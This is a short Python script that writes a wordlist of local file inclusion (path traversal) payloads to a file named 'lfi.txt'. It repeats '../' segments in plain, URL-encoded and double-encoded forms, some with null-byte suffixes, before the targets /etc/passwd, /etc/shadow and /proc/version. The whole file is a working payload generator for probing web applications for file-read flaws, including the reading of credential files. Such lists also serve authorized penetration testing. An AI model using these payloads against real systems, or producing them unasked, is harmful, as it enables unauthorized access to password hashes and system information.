path="/etc/passwd"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/etc/passwd%00"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/etc/passwd"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="/etc/passwd%00"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%2fetc%2fpasswd"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2fetc%2fpasswd%00"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2f%2fetc%2f%2fpasswd"
for i in range(21):
	for j in range(21-i,21):
		e="%2f%2f...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252Fetc%252Fpasswd"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%252Fetc%252Fpasswd%00"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252F%252Fetc%252F%252Fpasswd"
for i in range(21):
	for j in range(21-i,21):
		e="%252F%252F...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/etc/shadow"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/etc/shadow%00"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/etc/shadow"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="/etc/shadow%00"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%2fetc%2fshadow"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2fetc%2fshadow%00"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2f%2fetc%2f%2fshadow"
for i in range(21):
	for j in range(21-i,21):
		e="%2f..%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252Fetc%252Fshadow"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%252Fetc%252Fshadow%00"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252F%252Fetc%252F%252Fshadow"
for i in range(21):
	for j in range(21-i,21):
		e="%252F..%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/proc/version"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/proc/version%00"
for i in range(21):
	for j in range(21-i,21):
		e="/.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="/proc/version"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="/proc/version%00"
for i in range(21):
	for j in range(21-i,21):
		e="//...."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%2fproc%2fversion"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2fproc%2fversion%00"
for i in range(21):
	for j in range(21-i,21):
		e="%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%2f%2fproc%2f%2fversion"
for i in range(21):
	for j in range(21-i,21):
		e="%2f..%2f.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252Fproc%252Fversion"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
path="%252Fproc%252Fversion%00"
for i in range(21):
	for j in range(21-i,21):
		e="%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))

path="%252F%252Fproc%252F%252Fversion"
for i in range(21):
	for j in range(21-i,21):
		e="%252F..%252F.."
		c=''
		c=c+e
		print(c,end='',file=open('lfi.txt', 'a'))
	print(path,file=open('lfi.txt', 'a'))
